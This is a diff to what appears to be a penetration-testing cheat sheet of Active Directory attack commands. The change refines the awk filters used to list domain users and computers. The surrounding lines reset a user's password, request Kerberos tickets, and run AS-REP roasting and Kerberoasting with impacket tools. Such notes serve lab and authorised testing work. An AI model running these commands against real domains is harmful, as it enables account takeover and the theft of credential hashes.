@@ -218,8 +218,8 @@ unzip backup.zip -d .
 sudo skewme $TARGET
 impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
 impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
-impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
-impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames
+impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
